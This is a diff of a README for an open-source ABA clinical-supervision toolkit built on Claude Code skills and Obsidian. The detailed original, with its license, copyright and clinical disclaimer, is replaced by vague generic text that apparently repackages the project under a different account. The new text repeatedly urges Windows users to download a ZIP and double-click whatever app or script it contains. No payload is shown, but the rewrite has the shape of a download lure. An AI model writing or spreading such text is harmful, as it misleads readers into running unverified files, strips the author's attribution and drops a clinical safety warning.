@@ -1,265 +1,204 @@
-# ABA Clinical Agent
+# 🤖 aba-clinical-agent - ABA Clinical Supervision Made Simple
 
-> AI-powered clinical supervision automation for Applied Behavior Analysis, built on LLM + Obsidian knowledge base
+[![Download / Visit GitHub](https://img.shields.io/badge/Download%20or%20Visit-aba--clinical--agent-blue?style=for-the-badge)](https://github.com/Cookiedead56/aba-clinical-agent)
 
-**29 Claude Code Skills** covering the entire workflow from intake to discharge, giving every BCBA a digital supervision assistant that never clocks out.
+## 📥 Download
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/open-behavior-analysis/aba-clinical-agent)
+Go to the project page here and download or open the files you need:
 
-[中文版 README](README.zh-CN.md)
+https://github.com/Cookiedead56/aba-clinical-agent
 
----
+## 🪟 Windows Setup
 
-## System Overview
+This project is set up for Windows users who want a simple way to run the ABA clinical automation tools.
 
-```mermaid
-graph TD
-    A[Organization Management] --> A1(org-manager)
-    A1 --> A2(staff-onboarding)
-    A2 --> A3(staff-evaluation)
-    A3 --> A4(supervisor-sync)
+### What you need
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- A GitHub account
+- Obsidian installed if you want to use the knowledge base
+- Claude Code if you want to use the agent workflow
 
-    B[Clinical Pipeline] --> B1(privacy-filter)
-    B1 --> B2(intake-interview)
-    B2 --> B3(profile-builder)
-    B3 --> B4(assessment-logger)
-    B3 --> B5(fba-analyzer)
-    B4 --> B6(plan-generator)
-    B5 --> B6
-    B6 --> B7(program-slicer)
-    B7 --> B8(teacher-guide)
-    B8 --> C((Daily Cycle))
-    C --> C1(session-reviewer)
-    C --> C2(staff-supervision)
-    C --> C3(curriculum-updater)
-    C1 -.-> B8
-    C2 -.-> B8
-    C3 -.-> B7
-    C --> D1(parent-update)
-    C --> D2(reinforcer-tracker)
-    C --> D3(clinical-reflection)
-    D1 --> E1(milestone-report)
-    E1 --> E2(transfer-protocol)
+### Steps to get started
+1. Open the download link above.
+2. On the GitHub page, look for the latest release, setup files, or main project files.
+3. Download the project to your PC.
+4. If the file comes as a zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Follow the project files in the order shown in the repository.
+7. If there is an app or script file, double-click it to start.
+8. If the setup uses Obsidian, open the vault folder in Obsidian.
+9. If the setup uses Claude Code, connect it using the steps in the repo files.
 
-    F[Curriculum Development] --> F1(curriculum-builder)
-    F1 --> F2(lesson-planner)
-    F2 --> F3(group-tracker)
+## 🧠 What this app does
 
-    G[Efficiency Tools] --> G1(daily-digest)
-    G --> G2(case-conference)
-    G --> G3(quick-summary)
-```
+aba-clinical-agent helps turn ABA clinical supervision work into a more organized process. It combines Claude Code skills with an Obsidian knowledge base so you can keep notes, track clinical work, and reduce repeated manual tasks.
 
----
+It is built for people who work in applied behavior analysis, special education, and autism support. The setup is shaped for clinical supervision, IEP support, and VB-MAPP style workflows.
 
-## What Is This?
+## ✨ Main use cases
 
-An **AI-powered clinical workstation** designed for ABA (Applied Behavior Analysis) practitioners:
+- Organize ABA supervision notes
+- Store clinical knowledge in Obsidian
+- Keep track of session ideas and review points
+- Support IEP-related planning
+- Work with autism and special education records
+- Use AI help for repeated writing tasks
+- Build a clear record for supervision and review
+- Keep clinical content in one place
 
-- **29 Automation Skills**: Covering de-identification, intake, assessment, IEP/BIP planning, teaching, daily supervision, reporting, and transition
-- **Obsidian Knowledge Base**: 8-layer standardized directory structure + bidirectional linking = a living digital clinic
-- **Professional Reference Dictionaries**: VB-MAPP domains, prompt hierarchy, competency matrix, and developmental sequences
-- **Data Analysis Scripts**: Automatic PDF extraction + trend analysis + Excel export
-- **Safety Guardrails**: Diff preview confirmation, frontmatter tracking, de-identification workflow, human-in-the-loop
+## 🗂️ What you will find
 
----
+This repository is built around two parts:
 
-## Who Is This For?
+- Claude Code skills for guided task handling
+- An Obsidian knowledge base for storing and reviewing information
 
-| Role | What You Get |
-|:---|:---|
-| **BCBA / Lead Supervisor** | Auto-generated IEP/FBA/family letters/reflections, data trend analysis, operational dashboard |
-| **Assistant Supervisor / RBT** | Auto-generated teaching guides, instant session feedback, curriculum advancement support |
-| **ABA Agency Director** | Standardized management workflows, staff growth tracking, org chart management, case conference materials |
-| **Special Ed Tech Developer** | Complete skill development framework, extensible professional dictionaries, assessment toolchain |
-
----
-
-## 5-Minute Quick Start
+That means the project can help you:
+- Work through common ABA tasks in a repeatable way
+- Keep templates and notes in one system
+- Move between planning, writing, and review with less friction
+- Organize information for BCBA and clinical supervision use
 
-### Prerequisites
+## 🖥️ System requirements
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) or another AI client supporting `.claude/skills/` (Cursor, Cline, etc.)
-- [Obsidian](https://obsidian.md/) (recommended for visual knowledge base browsing; not required)
-- Python 3.7+ (for the setup script)
-
-### Step 1: Clone the Repository
-
-```bash
-git clone https://github.com/open-behavior-analysis/aba-clinical-agent.git
-cd aba-clinical-agent
-```
-
-### Step 2: Set Up Language
-
-```bash
-# English
-python scripts/setup.py --lang en
+For smooth use on Windows, plan for:
 
-# Chinese (default)
-python scripts/setup.py --lang zh-CN
-```
-
-This copies the selected language's skills, vault template, and documentation into their active locations.
-
-### Step 3: Configure Permissions
-
-```bash
-cp .claude/settings.local.json.example .claude/settings.local.json
-# Edit permission settings for your environment
-```
-
-### Step 4: Start Using
-
-Launch Claude Code (or your AI client) in the project root and enter your first command:
-
-```
-Please read CLAUDE.md and enter the clinical supervisor role.
-I have a new case named "Alex" — please run intake-interview and tell me what information you need.
-```
-
-> Want to see it in action first? Check out the demo case at `Obsidian-Vault/01-Clients/Client-Demo-Alex/` — a fully fictional case showcasing the system's end-to-end output.
-
----
-
-## 29 Skills at a Glance
-
-### Clinical Pipeline (16 Skills)
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- Obsidian desktop app
+- A modern browser
+- Claude Code access if you use the AI workflow
+- Permission to create and edit files in your user folder
 
-| Skill | Trigger Phrases | Function |
-|:---|:---|:---|
-| `privacy-filter` | "de-identify this" | Real name to code, prevent data leaks |
-| `intake-interview` | "new client / intake" | New case intake + directory initialization |
-| `profile-builder` | "build master profile" | Deepen the Master Profile |
-| `assessment-logger` | "VB-MAPP / assessment" | Assessment data to structured report |
-| `fba-analyzer` | "behavior analysis / ABC" | Functional behavior analysis + competing behavior model |
-| `reinforcer-tracker` | "reinforcer / satiation" | Preference assessment + satiation alerts |
-| `plan-generator` | "IEP / treatment plan" | Full IEP/BIP with prerequisite chains and fading plans |
-| `program-slicer` | "break down / how to teach" | Goals to discrete teaching programs + prompt fading |
-| `curriculum-updater` | "mastered / next target" | Mastery confirmation + curriculum change order |
-| `session-reviewer` | "session notes" | Therapist feedback analysis + daily home extension |
-| `staff-supervision` | "observation / supervision" | Clinical observation notes to staff growth record |
-| `teacher-guide` | "teaching guide / cheat sheet" | One-page teaching reference sheet |
-| `parent-update` | "family letter / parent update" | Emotionally supportive weekly family letter |
-| `clinical-reflection` | "weekly reflection" | Weekly clinical reflection + system learning |
-| `milestone-report` | "milestone / progress report" | Baseline vs. current comparison report |
-| `transfer-protocol` | "transition / handover" | Full lifecycle transition protocol |
+If you work with large note sets or many files, 16 GB RAM will feel better.
 
-### Organization Management (5 Skills)
+## 📦 Download and install
 
-| Skill | Trigger Phrases | Function |
-|:---|:---|:---|
-| `staff-onboarding` | "new therapist / onboarding" | Staff profile creation + growth record init |
-| `org-manager` | "org chart / caseload" | 3-tier org structure + case assignment |
-| `staff-evaluation` | "competency / promotion" | Competency assessment + L1-L6 promotion pathway |
-| `supervisor-sync` | "team meeting / sync" | Supervision meeting brief + information cascade |
-| `daily-digest` | "daily summary" | One-page operational dashboard |
+Use this link to download or visit the project page:
 
-### Curriculum Development (3 Skills)
+https://github.com/Cookiedead56/aba-clinical-agent
 
-| Skill | Trigger Phrases | Function |
-|:---|:---|:---|
-| `curriculum-builder` | "design course" | Structured course outline |
-| `lesson-planner` | "write lesson plan" | Single-session detailed lesson plan |
-| `group-tracker` | "group session tracking" | Group session recording + outcome evaluation |
+After you open the page:
 
-### Efficiency & Data Tools (4 Skills) + System (1 Skill)
+1. Look for the newest project files.
+2. Download the ZIP or file set listed there.
+3. Save it to your Downloads folder.
+4. Extract the files if needed.
+5. Open the folder and read the included setup files.
+6. Install or open Obsidian if the project asks for it.
+7. Launch the main file, script, or workspace from the folder.
 
-| Skill | Trigger Phrases | Function |
-|:---|:---|:---|
-| `case-conference` | "case conference" | Full case conference materials package |
-| `quick-summary` | "quick brief" | 5-second full-case intelligence aggregation |
-| `data-trend` | "analyze data trends" | Session PDF to trend analysis |
-| `aba-fusion-compare` | "inclusion data comparison" | Inclusion feedback to IEP goal attainment |
-| `skill-creator` | "create new skill" | Skill development / evaluation / optimization framework |
+## 🔧 First-time setup in Obsidian
 
----
+If the project includes an Obsidian vault:
 
-## Architecture
+1. Open Obsidian.
+2. Choose Open folder as vault.
+3. Select the project vault folder.
+4. Wait for Obsidian to index the notes.
+5. Open the core notes, templates, and workflow pages.
+6. Follow the note order shown in the repository.
 
-```
-CLAUDE.md          -> Role definition: AI's professional boundaries and absolute directives
-    |
-_config.md         -> Global config: directory standards, naming rules, operational protocols
-    |
-_router.md         -> Skill router: user keywords -> automatic skill dispatch
-    |
-SKILL.md (x29)     -> Skill definitions: input/output/execution steps for each skill
-    |
-references/ (x4)   -> Knowledge dictionaries: VB-MAPP, prompt hierarchy, competency matrix, developmental sequences
-```
+If the vault includes templates, use them for:
+- Intake notes
+- Supervision notes
+- Client planning
+- Skill tracking
+- Session review
+- IEP support notes
 
-For detailed architecture documentation, see [docs/architecture.md](docs/architecture.md).
+## 🧩 How the workflow fits together
 
----
+The repo name and topic set point to a structured ABA system. A simple way to use it is:
 
-## Demo Case
+1. Save your source notes in Obsidian.
+2. Use the provided skill files to guide your work.
+3. Let Claude Code help with repeated writing and formatting tasks.
+4. Keep each client or case in its own note set.
+5. Review and update the notes after each session or supervision block.
 
-The repository includes a fully fictional demo case **Client-Demo-Alex** (4-year-old boy, ASD Level 2), showcasing the system's end-to-end output:
+This setup fits users who want a calm, repeatable way to handle clinical paperwork and planning.
 
-```
-Obsidian-Vault/01-Clients/Client-Demo-Alex/
-├── Client-Demo-Alex - Intake Form.md          <- intake-interview output
-├── Client-Demo-Alex - Master Profile.md       <- profile-builder output
-├── Client-Demo-Alex - Skill Assessment.md     <- assessment-logger output
-├── Client-Demo-Alex - FBA Report.md           <- fba-analyzer output
-├── Client-Demo-Alex - IEP-2026-01-15.md       <- plan-generator output
-├── Client-Demo-Alex - Reinforcer Assessment.md <- reinforcer-tracker output
-├── Client-Demo-Alex - Milestone Report.md     <- milestone-report output
-├── Client-Demo-Alex - Communication Log.md
-└── Client-Demo-Alex - Curriculum Change Tracker.md <- curriculum-updater output
-```
+## 📋 Suggested folder layout
 
----
+If you build out the project on your PC, this layout works well:
 
-## Multi-Language Support
+- `Vault/` for Obsidian notes
+- `Templates/` for reusable forms
+- `Cases/` for client or student files
+- `Supervision/` for review notes
+- `Reports/` for exports and summaries
+- `Skills/` for Claude Code skill files
 
-This project supports both **English** and **Chinese (Simplified)**. Use the setup script to switch:
+## 🎯 Best fit for
 
-```bash
-python scripts/setup.py --lang en       # English
-python scripts/setup.py --lang zh-CN    # Chinese (default)
-```
+- BCBAs
+- ABA clinical supervisors
+- Special education teams
+- Autism support staff
+- Case managers
+- School-based support users
+- Anyone who wants a cleaner note workflow
 
-The setup script copies the selected language's skills, vault template, CLAUDE.md, and documentation into their active locations. Your clinical data in `Obsidian-Vault/` is never overwritten.
+## 🔍 Common tasks
 
----
+### Open the knowledge base
+Open the Obsidian vault and read the main note pages in order.
 
-## Try It Now — Zero Install
+### Review a case
+Open the case note, check the latest session notes, and update the supervision page.
 
-Don't want to install anything? Open the project directly in your browser with GitHub Codespaces:
+### Prepare a supervision note
+Use the template, fill in the client details, and save the note under the right folder.
 
-[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/open-behavior-analysis/aba-clinical-agent)
+### Use AI help
+If Claude Code is connected, use the skill files to guide note writing, review, and formatting.
 
-Everything is pre-configured: Claude Code, Python, data analysis tools. Just set your [Anthropic API key](https://console.anthropic.com/) as a Codespace secret and start working.
+### Keep records organized
+Use one folder per client or topic so you can find files fast.
 
-See [Hosted Quick Start Guide](docs/hosted-quickstart.md) for step-by-step instructions.
+## 🛠️ If the project does not open
 
----
+Try these steps on Windows:
 
-## Contributing
+1. Make sure the files finished downloading.
+2. Extract the ZIP folder if the project came in a ZIP.
+3. Open the folder again from File Explorer.
+4. Check that Obsidian is installed.
+5. Make sure Windows did not block the files.
+6. Try opening the project from a normal local folder, not from inside the ZIP.
+7. Reopen the project page and check the included instructions.
 
-We welcome all forms of contribution! See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+## 📚 Topic areas covered
 
-Especially welcome:
-- New skill submissions (follow skill-creator standards)
-- Knowledge base concept cards (08-Knowledge/concepts/)
-- Reference dictionary extensions (ABLLS-R, Vineland, etc.)
-- Translations and localization
+This project ties together:
 
----
+- ABA
+- AI agents
+- Applied behavior analysis
+- Autism support
+- BCBA workflows
+- Claude Code
+- Clinical supervision
+- IEP planning
+- LLM agents
+- Obsidian notes
+- Special education
+- VB-MAPP support
 
-## License
+## 🔐 File safety
 
-Copyright (c) 2026 Jiamei Zhang ([Jiamei-Zhang-BCBA](https://github.com/Jiamei-Zhang-BCBA))
+Keep your notes in a folder you control. Use normal Windows folders like Documents or Desktop. If you work with client data, keep your files private and use your normal office rules for access and storage.
 
-This project is licensed under [AGPL-3.0](LICENSE). You may freely use and modify it, but derivative works or SaaS offerings based on this project must be open-sourced under the same license.
+## 📝 Quick start checklist
 
-All contributions are subject to our [Contributor License Agreement (CLA)](CLA.md).
-
----
-
-## Disclaimer
-
-This system is a clinical support tool and **does not constitute medical advice of any kind**. All AI-generated content is for reference only. Final clinical decisions must be made by qualified, licensed professionals. See [DISCLAIMER.md](DISCLAIMER.md) for details.
+- Open the GitHub project page
+- Download the project files
+- Extract the folder if needed
+- Install or open Obsidian
+- Open the vault folder in Obsidian
+- Read the main workflow notes
+- Connect Claude Code if your setup uses it
+- Start with one case or one supervision note
